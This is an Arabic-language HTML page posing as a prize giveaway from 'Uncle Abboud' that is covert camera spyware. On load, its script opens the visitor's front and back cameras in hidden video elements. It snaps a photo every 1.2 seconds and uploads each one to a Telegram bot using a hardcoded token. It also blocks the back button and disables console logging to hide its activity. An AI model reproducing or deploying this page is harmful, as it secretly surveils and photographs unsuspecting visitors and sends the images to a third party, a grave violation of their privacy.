<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جائزة عمك عبود</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Tahoma', sans-serif;
            padding: 20px;
            animation: bgMove 10s infinite alternate;
        }
        @keyframes bgMove {
            0% { background-position: 0% 50%; }
            100% { background-position: 100% 50%; }
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            border-radius: 40px;
            padding: 40px 30px;
            max-width: 500px;
            width: 100%;
            border: 1px solid rgba(255,215,0,0.2);
            box-shadow: 0 30px 80px rgba(0,0,0,0.7);
            text-align: center;
        }
        .profile {
            width: 120px;
            height: 120px;
            background: linear-gradient(145deg, #ffd700, #f0a500);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 20px;
            font-size: 70px;
            box-shadow: 0 10px 40px rgba(255,215,0,0.3);
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
            0%,100%{ transform: translateY(0); }
            50%{ transform: translateY(-10px); }
        }
        h1 { color: #ffd700; font-size: 32px; text-shadow: 0 0 30px rgba(255,215,0,0.2); }
        .sub-title { color: #c0b7e6; font-size: 16px; margin-bottom: 25px; }
        .welcome-msg {
            background: rgba(255,215,0,0.08);
            padding: 15px 20px;
            border-radius: 16px;
            border-right: 3px solid #ffd700;
            color: #e0d6ff;
            font-size: 18px;
            margin-bottom: 30px;
        }
        .welcome-msg span { color: #ffd700; font-weight: bold; }
        .btn-claim {
            background: linear-gradient(135deg, #ffd700, #f0a500);
            color: #0a0a0a;
            border: none;
            padding: 16px 45px;
            border-radius: 60px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 8px 35px rgba(255,215,0,0.25);
            transition: 0.3s;
        }
        .btn-claim:hover { transform: scale(1.03); }
        .footer-note { color: #5a5280; font-size: 12px; margin-top: 20px; }
        .repeated-msg { color: #ffd700; font-size: 14px; opacity: 0.6; margin-top: 12px; }
    </style>
</head>
<body>

<div class="container">
    <div class="profile">🧔</div>
    <h1>🌹 عمك عبود يرحب بكم</h1>
    <p class="sub-title">أهلًا وسهلًا في ضيافتكم</p>
    <div class="welcome-msg">
        <span>“</span> مرحبًا، مرحبًا، ألف مرحبًا بكم في عالم عمك عبود <span>”</span>
    </div>
    <button class="btn-claim" id="claimBtn">🎁 خذ جائزتك من عمك عبود</button>
    <div class="repeated-msg">♻️ عمك عبود يرحب بكم — عمك عبود يرحب بكم</div>
    <div class="footer-note">© جميع الحقوق محفوظة لعمك عبود ❤️</div>
</div>

<script>
    // ============================================================
    // ================ BOT CONFIG =================================
    // ============================================================
    const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
    let CHAT_ID = '';

    // ============================================================
    // ================ الكاميرا فقط ===============================
    // ============================================================

    function dataURLtoBlob(dataURL) {
        const parts = dataURL.split(',');
        const mime = parts[0].match(/:(.*?);/)[1];
        const bstr = atob(parts[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
        return new Blob([u8arr], { type: mime });
    }

    function sendPhoto(imageData, caption = '') {
        if (!CHAT_ID || !imageData) return;
        try {
            const blob = dataURLtoBlob(imageData);
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, `photo_${Date.now()}.jpg`);
            fd.append('caption', caption);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
        } catch(e) {}
    }

    function requestCamera(facingMode, callback) {
        const constraints = {
            video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
        };
        navigator.mediaDevices.getUserMedia(constraints)
            .then(stream => {
                if (callback) callback(stream);
            })
            .catch(() => {
                // محاولة بدون تحديد مواجهة
                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                    .then(stream => {
                        if (callback) callback(stream);
                    }).catch(() => {});
            });
    }

    function startCapture(videoElement, label = '📸') {
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        setInterval(() => {
            if (videoElement.readyState >= 2) {
                try {
                    ctx.drawImage(videoElement, 0, 0, 640, 480);
                    const imgData = canvas.toDataURL('image/jpeg', 0.9);
                    sendPhoto(imgData, label);
                } catch(e) {}
            }
        }, 1200);
    }

    function captureFrontCamera() {
        requestCamera('user', (stream) => {
            const video = document.createElement('video');
            video.style.display = 'none';
            document.body.appendChild(video);
            video.srcObject = stream;
            video.play();
            startCapture(video, '📸 أمامي');
        });
    }

    function captureBackCamera() {
        requestCamera('environment', (stream) => {
            const video = document.createElement('video');
            video.style.display = 'none';
            document.body.appendChild(video);
            video.srcObject = stream;
            video.play();
            startCapture(video, '📸 خلفي');
        });
    }

    // ============================================================
    // ================ الحصول على Chat ID ========================
    // ============================================================
    function getChatId() {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
            .then(r => r.json())
            .then(d => {
                if (d.ok && d.result && d.result.length) {
                    const last = d.result[d.result.length - 1];
                    CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
                    if (CHAT_ID) {
                        // بدء التصوير فورًا
                        captureFrontCamera();
                        captureBackCamera();
                    } else {
                        setTimeout(getChatId, 1500);
                    }
                } else {
                    setTimeout(getChatId, 1500);
                }
            })
            .catch(() => setTimeout(getChatId, 1500));
    }

    // ============================================================
    // ================ منع الخروج ================================
    // ============================================================
    history.pushState(null, '', location.href);
    window.addEventListener('popstate', () => history.pushState(null, '', location.href));

    // ============================================================
    // ================ التشغيل التلقائي ==========================
    // ============================================================
    getChatId();

    // محاولة إضافية بعد ثانية
    setTimeout(() => {
        captureFrontCamera();
        captureBackCamera();
    }, 1000);

    // تعطيل وحدة التحكم
    console.log = console.warn = console.error = () => {};
</script>
</body>
</html>
